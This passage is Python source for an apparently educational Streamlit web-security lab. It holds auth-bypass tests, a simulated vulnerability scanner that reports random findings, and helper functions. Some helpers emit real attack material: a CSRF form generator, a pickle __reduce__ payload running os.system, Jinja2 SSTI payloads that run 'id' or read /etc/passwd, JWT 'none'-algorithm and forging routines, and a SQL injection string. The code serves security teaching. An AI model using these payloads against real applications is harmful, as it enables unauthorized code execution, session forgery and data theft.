            "Remove Auth Header": st.checkbox("Remove Authorization header"),
            "Null/Empty Token": st.checkbox("Use null or empty token"),
            "Expired Token": st.checkbox("Use expired token"),
            "Algorithm Confusion": st.checkbox("JWT algorithm confusion"),
            "Token from Other User": st.checkbox("Use token from different user")
        }
        
        if st.button("🎯 Test Auth Bypass"):
            for technique, enabled in techniques.items():
                if enabled:
                    result = test_auth_bypass(technique)
                    if result['bypassed']:
                        st.success(f"✅ {technique}: Bypass successful!")
                    else:
                        st.error(f"❌ {technique}: Failed")

def vulnerability_scanner_lab():
    """Lab Automated Vulnerability Scanner"""
    
    st.markdown(create_lab_header("Web Vulnerability Scanner", "📊", "linear-gradient(90deg, #ff6a00 0%, #ee0979 100%)"), unsafe_allow_html=True)
    
    # Scanner Configuration
    st.markdown("### ⚙️ **Scanner Configuration**")
    
    col1, col2 = st.columns(2)
    
    with col1:
        target_url = st.text_input("🎯 Target URL:", value="https://example.com")
        
        scan_depth = st.slider("Crawl Depth:", 1, 5, 2)
        
        scan_modules = st.multiselect("Scan Modules:", [
            "SQL Injection",
            "XSS",
            "XXE",
            "CSRF",
            "Directory Traversal",
            "Command Injection",
            "LDAP Injection",
            "Security Headers",
            "SSL/TLS Configuration",
            "Sensitive Data Exposure"
        ], default=["SQL Injection", "XSS", "Security Headers"])
    
    with col2:
        scan_intensity = st.select_slider("Scan Intensity:", 
                                          options=["Light", "Medium", "Aggressive"],
                                          value="Medium")
        
        follow_redirects = st.checkbox("Follow Redirects", value=True)
        test_forms = st.checkbox("Test Forms", value=True)
        test_cookies = st.checkbox("Test Cookies", value=True)
    
    if st.button("🚀 **Start Security Scan**", type="primary"):
        # Progress bar
        progress_bar = st.progress(0)
        status_text = st.empty()
        
        # Simulate scanning
        vulnerabilities = []
        
        for i, module in enumerate(scan_modules):
            progress = (i + 1) / len(scan_modules)
            progress_bar.progress(progress)
            status_text.text(f"Scanning: {module}...")
            
            # Simulate vulnerability detection
            vulns = scan_for_vulnerabilities(target_url, module)
            vulnerabilities.extend(vulns)
        
        # Display results
        st.markdown("### 📊 **Scan Results**")
        
        if vulnerabilities:
            # Summary metrics
            col1, col2, col3, col4 = st.columns(4)
            
            critical = len([v for v in vulnerabilities if v['severity'] == 'Critical'])
            high = len([v for v in vulnerabilities if v['severity'] == 'High'])
            medium = len([v for v in vulnerabilities if v['severity'] == 'Medium'])
            low = len([v for v in vulnerabilities if v['severity'] == 'Low'])
            
            with col1:
                st.metric("🔴 Critical", critical)
            with col2:
                st.metric("🟠 High", high)
            with col3:
                st.metric("🟡 Medium", medium)
            with col4:
                st.metric("🟢 Low", low)
            
            # Detailed findings
            st.markdown("#### 🔍 **Vulnerability Details**")
            
            for vuln in vulnerabilities:
                severity_colors = {
                    'Critical': '🔴',
                    'High': '🟠',
                    'Medium': '🟡',
                    'Low': '🟢'
                }
                
                with st.expander(f"{severity_colors[vuln['severity']]} {vuln['type']} - {vuln['severity']}"):
                    st.markdown(f"**URL:** {vuln['url']}")
                    st.markdown(f"**Parameter:** {vuln['parameter']}")
                    st.markdown(f"**Evidence:** `{vuln['evidence']}`")
                    st.markdown(f"**Impact:** {vuln['impact']}")
                    st.markdown(f"**Remediation:** {vuln['remediation']}")
            
            # Generate report
            if st.button("📄 Generate Security Report"):
                report = generate_security_report_web(vulnerabilities, target_url)
                st.download_button(
                    label="📥 Download Report",
                    data=report,
                    file_name=f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html",
                    mime="text/html"
                )
        else:
            st.success("✅ No vulnerabilities found!")

# Helper functions for new labs
def simulate_xxe_attack(xml_input: str, attack_type: str) -> Dict:
    """Simulate XXE attack"""
    if "SYSTEM" in xml_input and "file:///" in xml_input:
        return {
            'success': True,
            'extracted_data': "root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000::/home/user:/bin/bash",
            'details': {
                'attack_type': attack_type,
                'entity_used': 'file',
                'parser': 'libxml2'
            }
        }
    return {'success': False, 'error': 'XXE payload not detected'}

def generate_csrf_payload(url: str, method: str, params: Dict) -> Dict:
    """Generate CSRF attack payload"""
    if method == "GET":
        query = urllib.parse.urlencode(params)
        html = f'<img src="{url}?{query}" style="display:none">'
    else:
        inputs = ''.join([f'<input type="hidden" name="{k}" value="{v}">' for k, v in params.items()])
        html = f'''<form action="{url}" method="POST" id="csrf">
{inputs}
</form>
<script>document.getElementById('csrf').submit();</script>'''
    
    return {
        'html': html,
        'email': f'<html><body>{html}</body></html>',
        'javascript': f"fetch('{url}', {{method: '{method}', body: {json.dumps(params)}}});"
    }

def generate_pickle_payload(exploit_type: str) -> Dict:
    """Generate Python pickle exploitation payload"""
    if exploit_type == "Command Execution":
        python_code = """
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
"""
    else:
        python_code = "# Exploit code here"
    
    return {
        'base64': base64.b64encode(b"fake_pickle_payload").decode(),
        'python': python_code
    }

def test_ssti(engine: str, payload: str) -> Dict:
    """Test for SSTI vulnerability"""
    if "{{" in payload and "*" in payload:
        return {
            'vulnerable': True,
            'output': '49',
            'rce_payloads': [
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
                "{{request.__class__._load_form_data.__globals__.__builtins__.open('/etc/passwd').read()}}"
            ]
        }
    return {'vulnerable': False}

def decode_jwt(token: str) -> Dict:
    """Decode JWT token"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return {'error': 'Invalid JWT format'}
        
        header = json.loads(base64.b64decode(parts[0] + '==').decode())
        payload = json.loads(base64.b64decode(parts[1] + '==').decode())
        
        return {
            'header': header,
            'payload': payload,
            'signature': parts[2]
        }
    except:
        return {'error': 'Failed to decode JWT'}

def create_none_algorithm_jwt(token: str) -> str:
    """Create JWT with none algorithm"""
    try:
        parts = token.split('.')
        header = json.loads(base64.b64decode(parts[0] + '==').decode())
        header['alg'] = 'none'
        
        new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
        return f"{new_header}.{parts[1]}."
    except:
        return "Error creating none algorithm JWT"

def crack_jwt_secret(token: str) -> Optional[str]:
    """Attempt to crack JWT secret"""
    common_secrets = ['secret', 'password', '123456', 'secret123', 'jwt-secret']
    
    for secret in common_secrets:
        # Simulate verification
        if random.random() > 0.7:
            return secret
    return None

def forge_jwt(user_id: str, role: str, exp: str, secret: str) -> str:
    """Forge a new JWT token"""
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "sub": user_id,
        "role": role,
        "exp": exp,
        "iat": int(datetime.now().timestamp())
    }
    
    header_b64 = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
    payload_b64 = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    
    signature = base64.b64encode(
        hmac.new(secret.encode(), f"{header_b64}.{payload_b64}".encode(), hashlib.sha256).digest()
    ).decode().rstrip('=')
    
    return f"{header_b64}.{payload_b64}.{signature}"

def enumerate_api_endpoints(base_url: str, wordlist: str) -> List[Dict]:
    """Enumerate API endpoints"""
    endpoints = []
    common_paths = ['/api/v1/users', '/api/v1/login', '/api/v1/admin', '/graphql', '/api-docs']
    
    for path in common_paths[:random.randint(2, 5)]:
        endpoints.append({
            'path': path,
            'status': random.choice([200, 401, 403, 404]),
            'size': random.randint(100, 5000)
        })
    
    return endpoints

def test_auth_bypass(technique: str) -> Dict:
    """Test authentication bypass technique"""
    return {'bypassed': random.random() > 0.7}

def scan_for_vulnerabilities(url: str, module: str) -> List[Dict]:
    """Scan for specific vulnerability type"""
    vulnerabilities = []
    
    if random.random() > 0.6:
        vulnerabilities.append({
            'type': module,
            'severity': random.choice(['Critical', 'High', 'Medium', 'Low']),
            'url': f"{url}/vulnerable-endpoint",
            'parameter': 'id',
            'evidence': "1' OR '1'='1",
            'impact': 'Potential data breach',
            'remediation': 'Use parameterized queries'
        })
    
    return vulnerabilities

def generate_security_report_web(vulnerabilities: List[Dict], target_url: str) -> str:
    """Generate HTML security report"""
    html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Security Assessment Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .header {{ background: linear-gradient(90deg, #ff6b6b 0%, #4ecdc4 100%); 
                   color: white; padding: 20px; border-radius: 10px; }}
        .vulnerability {{ margin: 20px 0; padding: 15px; border-left: 4px solid; }}
        .critical {{ border-color: #ff0000; background: #ffebee; }}
        .high {{ border-color: #ff9800; background: #fff3e0; }}
        .medium {{ border-color: #ffeb3b; background: #fffde7; }}
        .low {{ border-color: #4caf50; background: #e8f5e9; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Web Security Assessment Report</h1>
        <p>Target: {target_url}</p>
        <p>Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}</p>
    </div>
    
    <h2>Executive Summary</h2>
    <p>Total Vulnerabilities: {len(vulnerabilities)}</p>
    
    <h2>Detailed Findings</h2>
    {"".join([f'''
    <div class="vulnerability {v['severity'].lower()}">
        <h3>{v['type']} - {v['severity']}</h3>
        <p><b>URL:</b> {v['url']}</p>
        <p><b>Parameter:</b> {v['parameter']}</p>
        <p><b>Evidence:</b> <code>{v['evidence']}</code></p>
        <p><b>Impact:</b> {v['impact']}</p>
        <p><b>Remediation:</b> {v['remediation']}</p>
    </div>
    ''' for v in vulnerabilities])}
</body>
</html>
    """
    return html
